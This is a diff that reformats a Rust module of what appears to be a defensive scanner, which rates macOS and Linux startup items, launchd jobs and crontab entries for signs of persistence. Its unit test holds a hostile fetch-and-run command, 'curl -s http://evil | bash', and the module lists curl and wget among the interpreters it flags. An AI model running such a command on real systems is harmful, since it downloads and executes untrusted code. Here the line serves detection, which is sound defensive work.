@@ -8,13 +8,32 @@ use super::{patterns, read_small, Area, Finding, Severity};
 use crate::env::{Env, Os};
 
 const INTERPRETERS: &[&str] = &[
-    "node", "bun", "deno", "python", "python3", "ruby", "perl", "osascript", "sh", "bash", "zsh", "curl", "wget",
+    "node",
+    "bun",
+    "deno",
+    "python",
+    "python3",
+    "ruby",
+    "perl",
+    "osascript",
+    "sh",
+    "bash",
+    "zsh",
+    "curl",
+    "wget",
 ];
 
 /// Where a legitimately installed program lives.
 const TRUSTED_PREFIXES: &[&str] = &[
-    "/Applications/", "/System/", "/Library/Application Support/", "/usr/", "/opt/homebrew/",
-    "/Library/PrivilegedHelperTools/", "/Library/Apple/", "/sbin/", "/bin/",
+    "/Applications/",
+    "/System/",
+    "/Library/Application Support/",
+    "/usr/",
+    "/opt/homebrew/",
+    "/Library/PrivilegedHelperTools/",
+    "/Library/Apple/",
+    "/sbin/",
+    "/bin/",
 ];
 
 pub struct StartupItem {
@@ -30,7 +49,9 @@ fn basename(s: &str) -> &str {
 
 fn looks_hidden(arg: &str, home: &Path) -> bool {
     let h = home.display().to_string();
-    let in_temp = ["/tmp/", "/private/tmp/", "/var/tmp/", "/Users/Shared/"].iter().any(|t| arg.starts_with(t));
+    let in_temp = ["/tmp/", "/private/tmp/", "/var/tmp/", "/Users/Shared/"]
+        .iter()
+        .any(|t| arg.starts_with(t));
     let hidden_in_home = arg.starts_with(&h) && arg[h.len()..].split('/').any(|c| c.starts_with('.') && c.len() > 1);
     in_temp || hidden_in_home
 }
@@ -49,15 +70,35 @@ pub fn evaluate(item: &StartupItem, env: &Env) -> Option<Finding> {
     let (sev, why) = if patterns::worst(&hits) == Some(Severity::High) {
         (Severity::High, hits[0].reason.to_string())
     } else if interp && hidden {
-        (Severity::High, format!("runs {} on a script hidden in {}", basename(&prog), item.args.iter().find(|a| looks_hidden(a, &env.home)).cloned().unwrap_or_default()))
+        (
+            Severity::High,
+            format!(
+                "runs {} on a script hidden in {}",
+                basename(&prog),
+                item.args
+                    .iter()
+                    .find(|a| looks_hidden(a, &env.home))
+                    .cloned()
+                    .unwrap_or_default()
+            ),
+        )
     } else if hidden {
-        (Severity::Medium, "runs a program from a hidden or temporary folder".to_string())
+        (
+            Severity::Medium,
+            "runs a program from a hidden or temporary folder".to_string(),
+        )
     } else if interp {
-        (Severity::Medium, format!("starts a {} script at login — unusual for normal apps", basename(&prog)))
+        (
+            Severity::Medium,
+            format!("starts a {} script at login — unusual for normal apps", basename(&prog)),
+        )
     } else if let Some(h) = hits.first() {
         (h.severity, h.reason.to_string())
     } else if missing {
-        (Severity::Low, "points to a program that no longer exists (leftover from an uninstalled app)".to_string())
+        (
+            Severity::Low,
+            "points to a program that no longer exists (leftover from an uninstalled app)".to_string(),
+        )
     } else if trusted || item.system {
         return None;
     } else {
@@ -110,7 +151,12 @@ fn launchd_items(env: &Env) -> Vec<StartupItem> {
                     args.insert(0, prog.to_string());
                 }
             }
-            items.push(StartupItem { label, source: p, args, system });
+            items.push(StartupItem {
+                label,
+                source: p,
+                args,
+                system,
+            });
         }
     }
     items
@@ -126,7 +172,9 @@ fn linux_items(env: &Env) -> Vec<StartupItem> {
         let Ok(rd) = std::fs::read_dir(&dir) else { continue };
         for e in rd.flatten() {
             let p = e.path();
-            let Some(text) = read_small(&p, 256 * 1024) else { continue };
+            let Some(text) = read_small(&p, 256 * 1024) else {
+                continue;
+            };
             for line in text.lines() {
                 if let Some(cmd) = line.trim().strip_prefix(key) {
                     items.push(StartupItem {
@@ -143,7 +191,9 @@ fn linux_items(env: &Env) -> Vec<StartupItem> {
 }
 
 fn crontab(env: &Env) -> Vec<Finding> {
-    let Ok(out) = Command::new("crontab").arg("-l").output() else { return vec![] };
+    let Ok(out) = Command::new("crontab").arg("-l").output() else {
+        return vec![];
+    };
     if !out.status.success() {
         return vec![];
     }
@@ -151,10 +201,22 @@ fn crontab(env: &Env) -> Vec<Finding> {
     text.lines()
         .map(str::trim)
         .filter(|l| !l.is_empty() && !l.starts_with('#'))
-        .filter(|l| !l.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_uppercase() || c == '_')))
+        .filter(|l| {
+            !l.split_once('=')
+                .is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_uppercase() || c == '_'))
+        })
         .filter_map(|l| {
-            let args: Vec<String> = l.split_whitespace().skip(if l.starts_with('@') { 1 } else { 5 }).map(String::from).collect();
-            let item = StartupItem { label: "crontab entry".into(), source: PathBuf::from("crontab"), args, system: false };
+            let args: Vec<String> = l
+                .split_whitespace()
+                .skip(if l.starts_with('@') { 1 } else { 5 })
+                .map(String::from)
+                .collect();
+            let item = StartupItem {
+                label: "crontab entry".into(),
+                source: PathBuf::from("crontab"),
+                args,
+                system: false,
+            };
             evaluate(&item, env).map(|mut f| {
                 f.can_quarantine = false;
                 f.advice = Some("Edit scheduled jobs with: crontab -e".into());
@@ -173,7 +235,10 @@ pub fn scan(env: &Env) -> Vec<Finding> {
     let mut out: Vec<Finding> = items.iter().filter_map(|i| evaluate(i, env)).collect();
     // System-wide items can't be moved without admin rights.
     for f in out.iter_mut() {
-        if f.path.as_deref().is_some_and(|p| !p.starts_with(&env.home.display().to_string())) {
+        if f.path
+            .as_deref()
+            .is_some_and(|p| !p.starts_with(&env.home.display().to_string()))
+        {
             f.can_quarantine = false;
         }
     }
@@ -188,17 +253,37 @@ mod tests {
     use super::*;
 
     fn item(args: &[&str]) -> StartupItem {
-        StartupItem { label: "x".into(), source: "/p".into(), args: args.iter().map(|s| s.to_string()).collect(), system: false }
+        StartupItem {
+            label: "x".into(),
+            source: "/p".into(),
+            args: args.iter().map(|s| s.to_string()).collect(),
+            system: false,
+        }
     }
 
     #[test]
     fn judges_startup_items() {
-        let env = Env { home: "/Users/me".into(), ..Env::sandboxed(Path::new("/tmp/x"), Os::Mac) };
+        let env = Env {
+            home: "/Users/me".into(),
+            ..Env::sandboxed(Path::new("/tmp/x"), Os::Mac)
+        };
         let sev = |a: &[&str]| evaluate(&item(a), &env).map(|f| f.severity);
-        assert_eq!(sev(&["/usr/local/bin/node", "/Users/me/.config/sys/run.js"]), Some(Severity::High));
-        assert_eq!(sev(&["/bin/bash", "-c", "curl -s http://evil | bash"]), Some(Severity::High));
+        assert_eq!(
+            sev(&["/usr/local/bin/node", "/Users/me/.config/sys/run.js"]),
+            Some(Severity::High)
+        );
+        assert_eq!(
+            sev(&["/bin/bash", "-c", "curl -s http://evil | bash"]),
+            Some(Severity::High)
+        );
         assert_eq!(sev(&["/Users/me/.local/bin/agent"]), Some(Severity::Medium));
-        assert_eq!(sev(&["/usr/local/bin/python3", "/Users/me/tools/sync.py"]), Some(Severity::Medium));
-        assert_eq!(sev(&["/Applications/Nope.app/Contents/MacOS/Nope"]), Some(Severity::Low));
+        assert_eq!(
+            sev(&["/usr/local/bin/python3", "/Users/me/tools/sync.py"]),
+            Some(Severity::Medium)
+        );
+        assert_eq!(
+            sev(&["/Applications/Nope.app/Contents/MacOS/Nope"]),
+            Some(Severity::Low)
+        );
     }
 }
